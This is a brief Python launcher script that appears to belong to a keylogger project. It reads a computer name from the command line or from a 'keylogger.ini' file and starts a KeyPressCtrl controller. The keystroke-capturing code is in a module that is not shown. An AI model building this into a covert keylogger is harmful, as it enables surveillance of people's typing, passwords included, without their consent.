from controller.keyPressCtrl import KeyPressCtrl
import sys, configparser

if len(sys.argv) > 1:
    name = sys.argv[1]
else:
    config = configparser.ConfigParser()
    config.read('keylogger.ini')
    name = config['default']['defaultComputerName']

keypress = KeyPressCtrl(name)